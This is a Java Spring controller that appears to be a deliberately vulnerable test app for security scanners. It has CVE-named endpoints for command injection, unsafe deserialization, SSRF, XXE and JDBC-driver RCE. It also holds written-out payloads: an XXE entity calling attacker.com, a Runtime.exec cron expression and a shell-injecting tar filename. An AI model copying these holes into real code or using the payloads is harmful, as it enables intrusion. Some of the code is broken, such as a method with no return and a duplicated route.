package com.example.shirodemo;

import com.amazonaws.services.s3.transfer.TransferManager;
import com.cronutils.model.CronType;
import com.cronutils.validation.Cron;
import com.github.pagehelper.Page;
import org.springframework.util.DigestUtils;
import org.apache.bcel.classfile.ConstantPool;
import org.apache.bcel.generic.ConstantPoolGen;
import org.apache.calcite.avatica.remote.AvaticaHttpClientFactoryImpl;
import org.apache.hadoop.fs.FileUtil;
import org.apache.hc.client5.http.impl.classic.HttpClientBuilder;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.sshd.common.session.SessionContext;
import org.apache.sshd.server.keyprovider.SimpleGeneratorHostKeyProvider;
import org.apache.xerces.xni.parser.XMLInputSource;
import org.codehaus.jettison.json.JSONException;
import org.codehaus.jettison.json.JSONObject;
import org.codehaus.plexus.archiver.zip.ZipUnArchiver;
//import org.apache.hadoop.util.Shell.ShellCommandExecutor;
import org.codehaus.plexus.util.cli.Commandline;
import org.cyberneko.html.HTMLConfiguration;
import org.cyberneko.html.HTMLScanner;
import org.geotools.data.jdbc.datasource.JNDIDataSourceFactory;
import org.ho.yaml.Yaml;
import org.ini4j.BasicOptionMap;
import org.apache.calcite.avatica.BuiltInConnectionProperty;
import org.apache.calcite.avatica.ConnectionConfigImpl;
import org.apache.calcite.avatica.ConnectionConfig;
import org.apache.calcite.avatica.remote.AvaticaHttpClientFactory;
import com.github.pagehelper.PageHelper;
import com.jd.sec_api.SecApi;
import com.ruoyi.common.utils.poi.ExcelUtil;

import graphql.parser.Parser;
import io.jsonwebtoken.Header;
import io.jsonwebtoken.Jwt;
import io.jsonwebtoken.JwtHandlerAdapter;
import io.jsonwebtoken.Jwts;
import liquibase.changelog.ChangeLogParameters;
import liquibase.parser.core.xml.XMLChangeLogSAXParser;
import liquibase.sdk.resource.MockResourceAccessor;
//import net.sourceforge.htmlunit.cyberneko.HTMLConfiguration;
//import net.sourceforge.htmlunit.cyberneko.HTMLScanner;
import net.sourceforge.htmlunit.cyberneko.parsers.DOMParser;
import ws.schild.jave.process.ProcessWrapper;

import org.slf4j.ext.EventData;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.multipart.MultipartFile;
import org.springframework.web.util.UriComponentsBuilder;
//import com.sun.jndi.rmi.registry.ReferenceWrapper;
//import org.w3c.dom.Document;
//import org.w3c.dom.NodeList;
import jodd.http.HttpRequest;
import java.io.BufferedReader;
//conf import org.apache.hadoop.mapred.JobConf;
//conf import org.apache.hadoop.mapred.JobHistory.JobInfo;
//import javax.naming.*;
//import javax.naming.Context;
//import javax.naming.InitialContext;
//import javax.naming.NamingException;
//import javax.naming.Reference;
/*import javax.naming.directory.DirContext;
import javax.naming.directory.SearchControls;
import javax.naming.directory.SearchResult;
import javax.servlet.http.HttpServlet;*/
//import javax.servlet.http.HttpServletRequest;
//import javax.xml.xpath.*;
//import javax.xml.xpath.XPathFactory;
//import javax.xml.xpath.XPath;
//import javax.xml.xpath.XPathExpression;
//import javax.xml.xpath.XPathConstants;
//import javax.xml.xpath.XPathExpressionException;
//import java.beans.*;
//import java.io.ByteArrayInputStream;
import java.io.File;
//import java.io.IOException;
//import java.rmi.RemoteException;
//import java.rmi.registry.LocateRegistry;
//import java.sql.*;
/*import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;*/
//import java.util.Properties;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;

import com.jd.jss.Credential;
import com.jd.jss.JingdongStorageService;
import com.jd.jss.client.ClientConfig;
/*import com.jd.sec_api.*;
import com.jd.sec_api.extra.codecs.*;*/

import javax.annotation.Resource;
//import javax.xml.parsers.DocumentBuilder;
//import javax.xml.parsers.DocumentBuilderFactory;
import javax.servlet.ServletRequest;
import org.xml.sax.InputSource;
//import org.yaml.snakeyaml.Yaml;
import org.xml.sax.SAXException;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServletRequest;
import java.net.*;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Properties;
import java.util.Set;

import org.w3c.dom.Node;
import javax.xml.namespace.QName;
import javax.xml.stream.XMLStreamReader;
import javax.xml.transform.Source;
//conf import javax.xml.xquery.*;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.Reader;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.InvocationTargetException;
import java.util.TimeZone;
import org.ttzero.excel.reader.ExcelReader;

//CVE-2021-41269

import javax.validation.ConstraintViolation;
import javax.validation.Valid;
import javax.validation.Validation;
import javax.validation.Validator;
import javax.validation.ValidatorFactory;
import javax.validation.constraints.NotNull;

//CVE-2022-0265
import com.hazelcast.config.Config;

@RestController
public class DemoController {

    @Autowired
    Second second;

    @RequestMapping(path = "/jwt")
    public String jwt(String value) throws FileNotFoundException, IOException {
        Jwts.parserBuilder()
                .setSigningKey("someBase64EncodedKey").build()
                .parse(value, new JwtHandlerAdapter<Jwt<Header, String>>() {
                    @Override
                    public Jwt<Header, String> onPlaintextJwt(Jwt<Header, String> jwt) {
                        return jwt;
                    }
                }); 
    }
    @RequestMapping(path = "/CVE-2021-41269")
    public String cve_2021_41269(String value) throws FileNotFoundException, IOException {
    Job job = new Job();
    //job.setCronExpression("T(java.lang.Runtime).getRuntime().exec(\"cmd whami\"); // 4 5 [${''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval(validatedValue)}]");
    job.setCronExpression(value);
    ValidatorFactory factory = Validation.buildDefaultValidatorFactory();
    Validator validator = factory.getValidator();

    Set<ConstraintViolation<Job>> constraintViolations = validator.validate(job);
    System.out.println("errmsg");
    String errmsg = constraintViolations.iterator().next().getMessage();
    System.out.println(errmsg);
        return "ok";
    }
    public static class Job {
            @Cron(type = CronType.SPRING)
            private String cronExpression;

            String getCronExpression() {
            return cronExpression;
            }
            void setCronExpression(String cronExpression) {
            this.cronExpression = cronExpression;
            }
    }

    @RequestMapping(path = "/CVE-2024-22243")
    public String cve_2024_22243(String value) throws FileNotFoundException, IOException {
   

        UriComponentsBuilder.fromUriString(value);
        return "ok";
    }

    @RequestMapping(path = "/CVE-2022-45047")
    public String cve_2022_45047(SessionContext  value) throws FileNotFoundException, IOException {
   

        SimpleGeneratorHostKeyProvider kp = new SimpleGeneratorHostKeyProvider();
        kp.loadKeys(value);
        return "ok";
    }

    @RequestMapping(path = "CVE-2022-42920")
    public String cve_2022_42920(ConstantPool  value) throws FileNotFoundException, IOException {
   

        new ConstantPoolGen(value);
        return "ok";
    }

    @RequestMapping(path = "CVE-2022-40150")
    public String cve_2022_40150(String  value) throws FileNotFoundException, IOException, JSONException {
        new JSONObject(value);
        return "ok";
    }

    @RequestMapping(path = "CVE-2022-41404")
    public String cve_2022_41404(String  value) throws FileNotFoundException, IOException {
   

        BasicOptionMap bm = new BasicOptionMap();
        bm.fetch(value);
        return "ok";
    }

    @RequestMapping(path = "CVE-2022-37734")
    public String cve_2022_37734(String  value) throws FileNotFoundException, IOException {
   

        Parser parser = new Parser();
        parser.parse(value);
        return "ok";
    }

    @RequestMapping(path = "/CVE-2022-0265")
    public String cve_2022_0265(String value) throws FileNotFoundException, IOException {
        //Config cfg = Config.loadFromStream(value);
        return "ok";
    }

    @RequestMapping(path = "/CVE-2022-36364")
    public String cve_2022_36364(String value) throws FileNotFoundException, IOException {
        Properties props = new Properties();
        props.setProperty(BuiltInConnectionProperty.HTTP_CLIENT_IMPL.name(),value); 
        ConnectionConfig config = new ConnectionConfigImpl(props);
        AvaticaHttpClientFactory httpClientFactory = new AvaticaHttpClientFactoryImpl();
        httpClientFactory.getClient(new URL("http://localhost:8765"), config, null);
        return "ok";
    }
    
    @RequestMapping(path = "/CVE-2022-29631")
    public String cve_2022_29631(String value) throws FileNotFoundException, IOException {
        HttpRequest req = HttpRequest.get(value);
        req.send();
        return "ok";
    }

    @RequestMapping(path = "/CVE-2022-29546")
    public String cve_2022_29546(String value) throws FileNotFoundException, IOException, SAXException {
        DOMParser parse = new DOMParser();
        parse.parse(value);
        return "ok";
    }

    @RequestMapping(path = "/CVE-2022-31159")
    public String cve_2022_31159(File value) throws FileNotFoundException, IOException, SAXException {
        TransferManager tm = new TransferManager();
        tm.downloadDirectory("bucketName", "keyPrefix",  value);
        return "ok";
    }

    @RequestMapping(path = "/CVE-2022-31197")
    public String cve_2022_31197(String value) throws FileNotFoundException, IOException, SAXException, SQLException {
        Connection con = DriverManager.getConnection("url", "user", "pass");
        Statement stmt = con.createStatement(ResultSet.TYPE_FORWARD_ONLY, ResultSet.CONCUR_UPDATABLE);
        ResultSet rs = stmt.executeQuery(value);
        rs.refreshRow();
        return "ok";
    }

    @RequestMapping(path = "/CVE-2022-24839")
    public String cve_2022_23868(List value) throws FileNotFoundException, IOException, SAXException, SQLException {
        ExcelUtil eu = new ExcelUtil(null);
        eu.exportExcel(value, null);
        return "ok";
    }
    @RequestMapping(path = "/CVE-2022-24818")
    public String cve_2022_24818(Map value) throws FileNotFoundException, IOException, SAXException, SQLException {
        JNDIDataSourceFactory jf = new JNDIDataSourceFactory();
        jf.createNewDataSource(value);
        return "ok";
    }
    @RequestMapping(path = "/CVE-2022-24839")
    public String cve_2022_24839(XMLInputSource value) throws FileNotFoundException, IOException, SAXException, SQLException {
        HTMLScanner hc = new HTMLScanner();
        hc.setInputSource(value);
        hc.scanDocument(true);
        return "ok";
    }





    @PostMapping("/executeCommand")
    public void executeCommand(String userInput) {
        // 注意：以下代码是示例，实际使用中应避免这样做。
        Commandline commandLine = new Commandline();
        // 如果userInput未经适当验证或转义，则可能导致命令注入
        commandLine.setExecutable(userInput);

        // 其他设置...

        // 执行命令行
        try {
            commandLine.execute();
        } catch (Exception e) {
            // 错误处理
        }
    }
    @PostMapping("/logEvent")
    public String logEvent(@RequestBody String xmlData) {
        try {
            // 这里的EventData类在SLF4J 1.7.25及更早版本中存在反序列化漏洞
            EventData data = new EventData(xmlData);
            // 假设这里会将EventData记录到日志中
            // ...
        } catch (Exception e) {
            // 在实际应用中，应该处理异常，但这里我们只是返回错误信息
            return "Error logging event: " + e.getMessage();
        }
        return "Event logged successfully";
    }
    @PostMapping("/extract")
    public ResponseEntity<String> extractArchive(@RequestParam("file") MultipartFile file) throws IOException {
        // 将上传的文件保存到临时目录
        File tempFile = File.createTempFile("uploadedArchive", ".zip");
        try (FileOutputStream fos = new FileOutputStream(tempFile)) {
            fos.write(file.getBytes());
        }

        // 创建 ZipUnArchiver 实例
        ZipUnArchiver zipUnArchiver = new ZipUnArchiver(tempFile);
        // 设置解压的目标目录
        File outputDirectory = new File("/path/to/output/directory"); // 请确保这个目录存在且安全
        zipUnArchiver.setDestDirectory(outputDirectory);

        // 提取 ZIP 文件
        zipUnArchiver.extract();

        // 返回成功消息
        return ResponseEntity.ok("Archive extracted successfully.");
    }
    public String deserializeYaml(@RequestBody String yamlInput,String yamlInput1,String yamlInput2) {
        Yaml yaml = new Yaml();
        yamlInput = yamlInput+yamlInput1;
        try {
            // 这里直接使用 Yaml#load 对传入的 YAML 字符串进行反序列化
            // 这是不安全的，因为它可以执行任意代码
            Object result = yaml.load(yamlInput);
            return "Deserialized object: " + result;
        } catch (Exception e) {
            return "Exception during deserialization: " + e.getMessage();
        }
    }
    public String deserializeYaml1(@RequestBody String yamlInput,String yamlInput1,String yamlInput2) {
        String yamlStr = yamlInput+yamlInput1;
        try {
            // 这里直接使用 Yaml#load 对传入的 YAML 字符串进行反序列化
            // 这是不安全的，因为它可以执行任意代码
            Object result = second.yml(yamlStr);
            Object result2 = second.yml2(yamlStr);
            return "Deserialized object: " + result;
        } catch (Exception e) {
            return "Exception during deserialization: " + e.getMessage();
        }
    }

    @GetMapping("/parse")
    public String parseXml(String xmlInput) {
        // Example XML string that could be used to exploit XXE
        String xmlInput1 = "<!DOCTYPE root [\n" +
                "  <!ENTITY % external SYSTEM \"http://attacker.com\">\n" +
                "%external;\n" +
                "]>\n" +
                "<root/>\n";

        XMLChangeLogSAXParser parser = new XMLChangeLogSAXParser();
        HashMap hashMap = new HashMap<String, String>();
        hashMap.put("xxe.xml", xmlInput);
        MockResourceAccessor ra = new MockResourceAccessor(hashMap);

        try {
            parser.parse("xxe.xml", new ChangeLogParameters(), ra);
            return "XML parsed successfully";
        } catch (Exception e) {
            return "Error parsing XML: " + e.getMessage();
        }
    }
    @PostMapping("/rce")
    public void rce(String maliciousClassName) {
        // 恶意类名，这个类应该存在于classpath中，并且包含恶意代码
        //String maliciousClassName = "EvilClass";

        // JDBC连接属性
        Properties props = new Properties();
        props.setProperty("user", "yourUsername");
        props.setProperty("password", "yourPassword");
        props.setProperty("authenticationPluginClassName", maliciousClassName); // 设置为恶意类名




        
        // PostgreSQL JDBC URL
        String jdbcUrl = "jdbc:postgresql://yourServer:5432/yourDatabase";
 
        
        try {
            // 尝试建立连接，如果存在漏洞，将尝试实例化恶意类
            Connection conn = DriverManager.getConnection(jdbcUrl, props);
     
            // 如果连接成功，并不意味着攻击成功，只是说明驱动尝试实例化了提供的类
            System.out.println("Connected to the database.");
            // ... 其他数据库操作



            
        } catch (Exception e) {
            // 处理异常，可能是因为类不存在，或者没有实现期望的接口，或者有其他的安全措施阻止了攻击
            e.printStackTrace();
        }
    }

    @PostMapping("/CVE202348909")
    public void CVE202348909(String inputFilePath) throws IOException {

        String ffmpegExecutablePath = "curl";
        String outputFilePath = "/Users/D0L1/test/2.mp4";
        ProcessWrapper processWrapper = new ProcessWrapper(ffmpegExecutablePath);
        processWrapper.addArgument("127.0.0.1:9999/test");
        processWrapper.addArgument(inputFilePath);
        processWrapper.addArgument("-c:v");
        processWrapper.addArgument("copy");
        processWrapper.addArgument("-c:a");
        processWrapper.addArgument("aac");
        processWrapper.addArgument(outputFilePath);
//        processWrapper.addArgument("-h");
//        processWrapper.addArgument("|");
//        processWrapper.addArgument("curl");
//        processWrapper.addArgument("http://127.0.0.1:8000");
        System.out.println(processWrapper);

        InputStream errorStream = null;
        try {
            processWrapper.execute();

            Thread.sleep(10000);

            InputStream inputStream = processWrapper.getInputStream();
            OutputStream outputStream = processWrapper.getOutputStream();
            errorStream = processWrapper.getErrorStream();


            System.out.println(inputStream);
            System.out.println(outputStream);
            processWrapper.close();


        } catch (Exception e) {
            e.printStackTrace();
            BufferedReader errorReader = new BufferedReader(new InputStreamReader(errorStream));
            String line;
            while ((line = errorReader.readLine()) != null) {
                System.err.println(line);
            }

        }
    }
    @RequestMapping(path = "/permit/{value}")
    public String permit(@PathVariable final String value) throws FileNotFoundException, IOException {
        boolean safe = SecApi.validator().jdRedirectCheck(value);
        //String safe = SecApi.validator().isValidSafeSqlArg(value)?"true":"false";

        Page<Object> ok = PageHelper.startPage(1, 1, true);

        System.out.println("success!");
        return "ok";
    }
    
   /*  @RequestMapping("/ccc")
    public Boolean testcount(HttpServletRequest request) throws IllegalAccessException, InvocationTargetException {
        String url =  request.getParameter("url");
        return SecApi.validator().jdSsrfExternalCheck(url);
    }
*/
    @RequestMapping("/testssrf")
    public String testSsrf(HttpServletRequest request) throws IllegalAccessException, InvocationTargetException, MalformedURLException, IOException {
        String url =  request.getParameter("url");
        new URL(url).openStream();
        return "ok";
    }
    /*
     * @RequestMapping(path = "/testJndi") public String testJndi(final String url)
     * throws NamingException, RemoteException { final Properties env = new
     * Properties(); env.put(Context.INITIAL_CONTEXT_FACTORY,
     * "com.sun.jndi.rmi.registry.RegistryContextFactory");
     * env.put(Context.PROVIDER_URL, "rmi://127.0.0.1:1099"); final InitialContext
     * ctx = new InitialContext(env); LocateRegistry.createRegistry(1099); final
     * Reference reference = new Reference("Evil", "Evil", url); new
     * ReferenceWrapper(reference); final ReferenceWrapper referenceWrapper = new
     * ReferenceWrapper(reference); ctx.bind("evil", referenceWrapper); return
     * "success"; }
     */
    /*
     * @RequestMapping(path = "/testcmd") public void testJcmd(final String dir)
     * throws IOException, SQLException { System.out.println(dir); final String[]
     * cmdList = new String[] { "cmd", "/c", "dir " + dir }; // String[] cmdList =
     * new String[]{"/bin/sh", "-c", "ls",";pwd"}; // String[] cmdList = new
     * String[]{"/bin/sh", "-c", "\"ls;pwd\""}; final Process p =
     * Runtime.getRuntime().exec(cmdList); }
     * 
     * @RequestMapping(value = "/XPathTest_S_12_1_0001", method = RequestMethod.GET)
     * public NodeList XPathTest_S_12_1_0001(final Document document, final String
     * string) { final XPathFactory xPathfactory = XPathFactory.newInstance(); final
     * XPath xpath = xPathfactory.newXPath(); try { final XPathExpression xp =
     * xpath.compile("//*[@begin]" + string); final NodeList timedNodes = (NodeList)
     * xp.evaluate(document, XPathConstants.NODESET); return timedNodes; } catch
     * (final XPathExpressionException e) { throw new RuntimeException(e); } }
     */
    @RequestMapping(value = "/test", method = RequestMethod.GET)
    public void handle(final HttpServletRequest request) throws Exception {
        final String name = request.getParameter("name");
        final ClientConfig config = new ClientConfig();
        final JingdongStorageService jss = new JingdongStorageService(new Credential("accessKey", "secretKey"), config);

        // final String md5 =
        // jss.bucket("dengliang.org").object("index.html").a().b().entity(new
        // File("/export/test.html")).contentType(name).put();
    }

    /*
     * @RequestMapping(value = "/testXXE", method = RequestMethod.GET) public void
     * testXXE(final HttpServletRequest request) throws Exception { final String
     * code = request.getParameter("code"); final String body =
     * request.getParameter("body"); final DocumentBuilderFactory dbf =
     * DocumentBuilderFactory.newInstance(); // 禁用 DOCTYPE
     * dbf.setExpandEntityReferences(false);
     * dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
     * dbf.setXIncludeAware(false); final DocumentBuilder db =
     * dbf.newDocumentBuilder();
     * 
     * final Document doc = db.parse(new ByteArrayInputStream(body.getBytes(code)));
     * }
     */
    @PostMapping("/CVE_2022_25168")
    public void CVE_2022_25168(String filename) {
        // 创建一个合法的tar文件
        File file = new File("合法tar文件.tar");

        // 创建一个目的地目录
        File dst = new File("目的地目录");

        // 利用漏洞：通过构造恶意的文件名，注入shell命令
        // 在这个例子中，我们尝试在解压后执行一个shell脚本
        // 注意：实际的命令注入将取决于具体的shell环境和Hadoop实现细节
        //String filename = "'; bash -c 'echo \"恶意命令执行\" > exploit_output.txt'; #'";

        // 调用有漏洞的API
        // 在真实环境中，这个调用应该在一个能够执行shell命令的环境中执行
        try {
            FileUtil.unTar(file, new File(dst, filename));
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

        // 输出结果，如果漏洞被成功利用，exploit_output.txt应该会被创建并包含特定的内容
        File exploitOutput = new File("exploit_output.txt");
        if (exploitOutput.exists()) {
            System.out.println("Exploit successful, output written to: " + exploitOutput.getAbsolutePath());
        } else {
            System.out.println("Exploit failed, output file not created.");
        }
    }
    public static String affixStr(Object... strS) {
        StringBuilder sb = new StringBuilder();
        for (Object str : strS) {
            sb.append(str);
        }
        return sb.toString();
    }
    @GetMapping(value = "/curl")
    @ResponseBody
    public Integer callWebHook(@Valid @NotNull String callUrl, String token) {
        return trigger(callUrl, token, null);
    }
    private Integer trigger(String callUrl, String token, Integer hookId) {
        if (null == hookId) {
            return 404;
        }
        String EVENT = "Push Hook";
        StringBuilder sb = new StringBuilder();
        HttpPost httpPost = new HttpPost(callUrl);
        CloseableHttpResponse response = null;
        int resultCode = 500;
        long startMills = System.currentTimeMillis();
        try {
            httpPost.addHeader("Content-Type", "application/json;charset=UTF-8");
            httpPost.addHeader("X-Gitlab-Event", EVENT);

            CloseableHttpClient client = HttpClients.custom().create().build();
            client.execute(httpPost);
        } catch (Exception e) {
            
        } finally {
            try {
                if (null != response) {
                    response.close();
                }
            } catch (IOException e) {
               
            }
        }
        return 1;
    }


    public static void main(String[] args) throws URISyntaxException, MalformedURLException, UnsupportedEncodingException {
        System.out.println(DigestUtils.md5DigestAsHex(affixStr("Coding","test",1).getBytes()));
    }
    
}
